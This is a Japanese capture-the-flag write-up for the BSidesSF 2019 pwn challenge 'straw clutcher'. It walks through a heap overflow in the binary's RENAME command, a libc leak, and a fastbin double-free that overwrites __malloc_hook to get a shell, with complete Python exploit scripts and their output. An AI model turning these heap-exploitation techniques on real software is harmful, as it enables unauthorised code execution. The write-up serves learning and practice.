# [pwn 400pts] straw clutcher - BSidesSF 2019 CTF
参加中は手を付けていない問題です。
64bitバイナリでセキュリティ機構は基本的に有効のようです。
```
$ checksec straw-clutcher 
[*] 'straw-clutcher'
    Arch:       64 bits (little endian)
    NX:         NX enabled
    SSP:        SSP enabled (Canary found)
    RELRO:      Partial RELRO
    PIE:        PIE enabled
```
IDAで開くと大量のフローグラフが出力されます。

しばらく解析しましたがIDAでもHopperでも量が多すぎて意味が分かりません。
ということで公開された問題のファイルを見ましたが、re2cなるものを使ってCのファイルが作られているようで、見たことのない文法のファイルがありました。(StrawClutcher.re)

なんとなくで読むと、次のような機能がありそうです。

- `login id client`: `id=anonymous`でログインできる。
- `put/stor filename size`: ファイルをアップロードする(`upload_file`)
- `get/retr filename`: ファイルをダウンロードする(`download_file`)
- `dele filename`: ファイルを削除する(`delete_file`)
- `trunc filename size`: ファイルをカットする(`truncate_file`)
- `rename filename1 filename2`: ファイル名を変更する(`rename_file`)
- `list`: ファイル一覧を表示する(`list`)
- `help`: ヘルプを表示する(LISTなど一部コマンドだけしか表示されない)

そして、ファイルを管理する次の構造体があります。
```c
struct filedata {
	char filename[FILENAMESIZE];
	long length;
	unsigned char *data;
	int mmap;
	SLIST_ENTRY(filedata) entries;
};
```
LISTとかの処理を見ると分かるのですが、アップロードしたファイルはここに連結リストとして格納されるようです。

`upload_file`では同じファイル名が存在しないかや、ファイルサイズが制限内かなどチェックし、callocでfiledata構造体を確保します。
そして、strncpyで`strlen(filename)`だけ`fdp->filename`にコピーします。
filedataのfilenameはサイズが固定なので、ヒープオーバーフローがあるかなーと思ったのですが、ちゃんと`strlen(filename) >= FILENAMESIZE`でチェックされていました。

※解いてる途中で分かったのですが拡張子がないとアップロードできない模様。そんな処理書いてあるか？
あと拡張子は最初の40字以内に入ってないとダメ。

`delete_file`はファイル名が一致するものを探し、一致したらデータをfree、次に構造体をfreeしています。

`dwnload_file`はファイル名が一致するものを探し、そのdataをstdoutに出力します。

`rename_file`はファイル名が一致するものを探し、一致したら`memcpy(fdp->filename, destination, strlen(destination))`します。
これは明らかにヒープオーバーフローですね。
destinationに対するサイズチェックは無いので使えそうです。

`truncate_file`はファイル名が一致するものを探し、一致してかつそのファイルサイズよりも小さい値が渡されたら、`fdp->length`を新しい`length`に変更します。
データ自体は削除されていないようです。

ということで全体の処理を読みました。
とりあえず`rename_file`のヒープオーバーフローでdataのポインタを書き換えて、`download_file`でlibcのバージョンとロードアドレスを特定しましょう。
~~いやまて、PIEが有効じゃんどうすんのこれ。~~
こんなときのためのunsorted binでした。
filedataのlengthを書き換えることで以降のヒープ上のデータを全てリークできます。
したがって、ファイル1を確保 --> 巨大なファイル2を確保 --> ファイル2を削除 --> ファイル1のlengthを上書き --> ファイル1をダウンロード、という流れでmain_arenaへリンクされたアドレスが見えるはずなので、libcが特定できそうです。

delete以外にも色んなところにfreeがあってヒープの中身が意味不明になっているのですが、とりあえずlibcのアドレスっぽいものが出力されました。
gdbで調べると`main_arena+88`だそうです。
```
gdb-peda$ x/4wx 0x7fdd1ed027b8
0x7fdd1ed027b8 <main_arena+88>: 0xaf77c390      0x000055a0      0xaf77b370      0x000055a0
```

ということで、`main_arena`からlibcのバージョンを特定したかったのですが、libc databaseでは見つかりませんでした。
たぶん`main_arena`というシンボルが存在しないからだと思います。
幸いローカルにlibcファイル一式を揃えてあったので、次のスクリプトでlibcを探しました。

```python
from subprocess import check_output
from glob import glob
import re

for filepath in glob("/home/ptr/warehouse/libc-database/db/*.so"):
    result = check_output(["main_arena", filepath])
    r = re.findall(b"0x([0-9a-f]+)", result)
    if not r:
        continue
    if (0x7f4c5cf21b20 - int(r[0], 16)) & 0xfff == 0:
        print(filepath)
```

いくつか出てきましたが、有力候補は次の3つです。
```
/home/ptr/warehouse/libc-database/db/libc6_2.23-0ubuntu10_amd64.s
/home/ptr/warehouse/libc-database/db/libc6_2.23-0ubuntu3_amd64.so
/home/ptr/warehouse/libc-database/db/libc6_2.23-0ubuntu11_amd64.so
```

とりあえずこれでlibcのロードアドレスは特定できたのかな...？

```python
from ptrlib import *

def upload_file(filename, size, data):
    assert isinstance(filename, str)
    sock.sendline("PUT {} {}".format(filename, size))
    sock.send(data)

def download_file(filename):
    assert isinstance(filename, str)
    sock.sendline("GET {}".format(filename))
    sock.recvuntil("get ")
    size = int(sock.recvuntil(" "))
    sock.recvline()
    return sock.recv(size)

def delete_file(filename):
    assert isinstance(filename, str)
    sock.sendline("DELE {}".format(filename))

def rename_file(filename1, filename2):
    assert isinstance(filename1, str)
    assert isinstance(filename2, str)
    sock.sendline("RENAME {} {}".format(filename1, filename2))

libc = ELF("./libc6_2.23-0ubuntu10_amd64.so")
sock = Socket("127.0.0.1", 4321)
#sock = Socket("127.0.0.1", 4322)

upload_file("A.BIN", 0x10, "A" * 0x10)
payload = "A" * 38 + "." + "A00"
rename_file("A.BIN", payload)
upload_file("B.BIN", 0x1000, "B" * 0x1000)
upload_file("C.BIN", 0x10, "C" * 0x10)
delete_file("B.BIN")
data = download_file(payload)
addr = data[0xf0:0xf8]
libc_base = u64(addr) - 88 - 0x3c4b20
dump("libc_base = " + hex(libc_base))

sock.interactive()
```

```
$ python solve.py
[+] Socket: Successfully connected to 127.0.0.1:4321
[ptrlib] libc_base = 0x7f7969283000
[ptrlib]$ 200 Data transferred!
```

dataのポインタを改竄した後dataを読み込むことはできても書き込むことはできません。
また、libcのバージョンは2.23なので、tcacheは導入されていません。
したがって、double freeからのfastbin corruption attackをする必要がありそうです。
libcと同じ要領でヒープのアドレスはリークできるので、dataのポインタを改竄することでdouble freeを引き起こせます。

ただ、いろいろやっている内に知ったのですが、ファイル名は正規表現で`[A-Za-z0-9]+.[A-Za-z0-9]{3}`を満たす必要があります。
これにはoff-by-oneの要領で`fdp->data`の下位1バイトを変更してやれば良さそうです。

次に、fastbin attackを成立させるにはサイズチェックを通過する必要があります。
これは以前HackIMか何かのCTFの問題を解く最中に調べて知ったことなのですが、`__malloc_hook`の前に`0x7f.... `のようなアドレスが存在するので、数バイトずらして0x7fをサイズとして認識させてやれば回避できるそうです。(結局その問題はtcacheだったので使わなかったけど。)
できるか分かりませんがやってみましょう。

※参考文献[2]にこれの分かりやすい解説が「fastbin attack with 0x70 chunk」として紹介されています。

あとfiledata構造体はcallocで確保されるので注意です。
書き込んだ情報が0で埋められてしまいます。

さて、ファイルを削除するときはもちろん次の順番でfreeされます。
```c
free(fdp->data);
free(fdp);
```
他にも、PUT, GET, DELETE, TRUNCの処理終了後に
```c
free(filename);
```
RENAMEの処理終了後に
```c
free(filename1);
free(filename2);
```
があります。
訳が分からなくなってきたので逆算して考えましょう。
当面の目標はfastbinを次のようにリンクさせることです。(double free)
**※後で説明しますがfastbinの検知機構を回避するために間に別のアドレスを挟む必要があります。この時はまだ気づいてない。**
```
fastbin[for 0x70] --> (fdp->data) --> (fdp->data) [--> 以降無限]
```
幸いにもfastbinはサイズに応じて分かれているのでファイル名のfreeは気にしなくて良さそうです。

fastbinが上の状態になった後にすべき処理は以下の3つでしょう。
```python
upload_file("X.EXE", 0x70, p64(__malloc_hook - 0x20 - 3) + b"\x00" * 0x68)
upload_file("Y.EXE", 0x70, b"Y" * 0x70)
upload_file("Z.EXE", 0x70, b"\x00" * 0x13 + p64(addr_one_gadget) + b"\x00" * 0x55)
```
これで`__malloc_hook`にone gadget rceのアドレスが書き込まれ、以降mallocした瞬間にシェルが奪えるはずです。

さて、どうやって上述のdouble freeを引き起すかですが、RENAMEのオーバーフローで適当なfdpのdataをサイズが0x70の別のdataのアドレスに向けて、両方のファイルを削除すれば良さそうです。
なぜなら、これらの2つのファイルを削除すると、サイズ0x70が入るfastbinに同じアドレスが2つ入るからです。

とりあえずサイズ0x70の領域を確保して、そのアドレスを計算しましょう。
~~リークした`A.BIN`の`fdp->data`から0x90バイト先にヒープを指すアドレスがあるのですが、そのアドレスから0x1060バイト先に確保した0x70バイトの領域(`C.BIN`のdata)があります。~~
```
gdb-peda$ x/16wx 0x559342c1d340
0x559342c1d340: 0x52f107b8      0x00007fda      0x52f107b8      0x00007fda
0x559342c1d350: 0x00000000      0x00000000      0x00000000      0x00000000
0x559342c1d360: 0x42424242      0x42424242      0x42424242      0x42424242
0x559342c1d370: 0x42424242      0x42424242      0x42424242      0x42424242
gdb-peda$ x/16wx 0x559342c1d340 + 0x1060
0x559342c1e3a0: 0x43434343      0x43434343      0x43434343      0x43434343
0x559342c1e3b0: 0x43434343      0x43434343      0x43434343      0x43434343
0x559342c1e3c0: 0x43434343      0x43434343      0x43434343      0x43434343
0x559342c1e3d0: 0x43434343      0x43434343      0x43434343      0x43434343
```
~~ということで、`A.BIN`の`fdp->data`を`C.BIN`の`fdp->data`に向けてやって、`C.BIN`と`A.BIN`を削除すればdouble freeできるはずです。~~

RENAMEには`strlen(fn1) >= 32`をチェックする機能があったので`A.BIN`はもう使えませんでした。
そもそも`C.BIN`の`fdp->data`の下位1バイトが英数字になるように調節するのが面倒だしlibcが合ってるか問題もあるし先が長すぎる。

時間と体力の限界が来たので参考文献[1]のwriteupを写経しようと思います。
writeupのコードを読んだところ、新しくファイルを作って、その内容を偽のfiledata構造体として、そのdataをサイズが0x70のチャンクに向けるようです。
さらに、サイズ0x70のチャンクは2つ作ってすぐにfreeしています。
先に書いておいた偽のfiledataから、これら2つのdataを指すようにします。
そして偽のfiledataをdataとして持つfiledataをRENAMEするときにentriesの下位1バイトを上書きして偽のfiledataに向けます。
こうすれば元のentriesと偽のfiledataのアドレスが近いため下位1バイトの上書きでできます。

なぜ2つのファイルを削除したかというと、fastbin corruptionの検知を回避するためです。
連続して同じアドレスを繋いでしまうとtcacheとは違って検知されてしまいます。

あとは偽のfiledataに書いたファイル名で削除するとdouble freeできます。

ちなみにlibcのバージョンは合っていたようです。

```python
from ptrlib import *

def upload_file(filename, size, data):
    assert isinstance(filename, str)
    sock.sendline("PUT {} {}".format(filename, size))
    sock.send(data)

def download_file(filename):
    assert isinstance(filename, str)
    sock.sendline("GET {}".format(filename))
    sock.recvuntil("get ")
    size = int(sock.recvuntil(" "))
    sock.recvline()
    return sock.recv(size)

def delete_file(filename):
    assert isinstance(filename, str)
    sock.sendline("DELE {}".format(filename))

def rename_file(filename1, filename2):
    assert isinstance(filename1, str)
    assert isinstance(filename2, str)
    sock.sendline("RENAME {} {}".format(filename1, filename2))

libc = ELF("./libc6_2.23-0ubuntu10_amd64.so")
sock = Socket("127.0.0.1", 4321)
libc_main_arena = 0x3c4b20
libc_one_gadget = 0x4526a
#libc = ELF("/lib64/libc.so.6")
#sock = Socket("127.0.0.1", 4322)
#libc_main_arena = 0x3c6760

# libc leak
upload_file("AAA.BIN", 10, "A" * 10)
payload1 = "A" * 38 + "." + "A00"
rename_file("AAA.BIN", payload1)
upload_file("BBB.BIN", 0x80, "B" * 0x80)
upload_file("CCC.BIN", 10, "C" * 10)
delete_file("BBB.BIN")
data = download_file(payload1)
addr_heap = u64(data[160:168])
addr_main_arena = u64(data[184:192]) - 88
libc_base = addr_main_arena - libc_main_arena
addr_malloc_hook = libc_base + libc.symbol("__malloc_hook")
addr_one_gadget = libc_base + libc_one_gadget
dump("heap = " + hex(addr_heap))
dump("libc base = " + hex(libc_base))

# fake filedata
fake_fd = b"999.999\x00" + b"\x00" * 32 # filename
fake_fd += p64(0x68) # length
fake_fd += p64(addr_heap + 0x250) # F.BIN->data
fake_fd += p64(0)
fake_fd += p64(addr_heap + 0x190) # E.BIN->data
upload_file("D.BIN", 0x48, bytes2str(fake_fd))

# 0x70 chunks
upload_file("E.BIN", 0x68, "E" * 0x68)
upload_file("F.BIN", 0x68, "F" * 0x68)
delete_file("E.BIN")
delete_file("F.BIN")

# double free
rename_file("D.BIN", "D" * 56 + "DDDDD.DD" + "P")
delete_file("999.999")

# fastbin attack
upload_file("X.BIN", 0x68, p64(addr_malloc_hook - 0x13) + b"X" * 0x60)
upload_file("Y.BIN", 0x68, "Y" * 0x68)
upload_file("Z.BIN", 0x68, "Z" * 0x68)

# get the shell!
upload_file("SH.BIN", 0x68, b"AAA" + p64(addr_one_gadget) + b"A" * 0x5d)
sock.sendline("PUT HELLO.PWN 10")

sock.interactive()
```

```
$ python solve.py 
[+] Socket: Successfully connected to 127.0.0.1:4321
[ptrlib] heap = 0x555cedaa8250
[ptrlib] libc base = 0x7f96cb952000
[ptrlib]$ 200 Data transferred!
200 Entry created
200 Entry created
200 Entry created
200 Filename "E.BIN" removed
200 Filename "F.BIN" removed
200 Filename renamed
200 Filename "999.999" removed
200 Entry created
200 Entry created
200 Entry created
200 Entry created

[ptrlib]$ ls /home/ctf
flag.txt
straw-clutcher
[ptrlib]$ cat /home/ctf/flag.txt
CTF{hoisting_the_flag}
[ptrlib]$
```

# 感想
ソースコードありで1日かけても自力では解けなかった。
今までで一番きつかったです。
でもこのCTFあと1問500ptsが残ってるんだよなー、さすがBSidesSFは難しい。

# 参考文献
[1] [https://github.com/merrychap/ctf-writeups/tree/master/2019/BSidesSF%202019%20CTF/straw_clutcher](https://github.com/merrychap/ctf-writeups/tree/master/2019/BSidesSF%202019%20CTF/straw_clutcher)

[2] [https://hama.hatenadiary.jp/entry/2018/12/08/142437](https://hama.hatenadiary.jp/entry/2018/12/08/142437)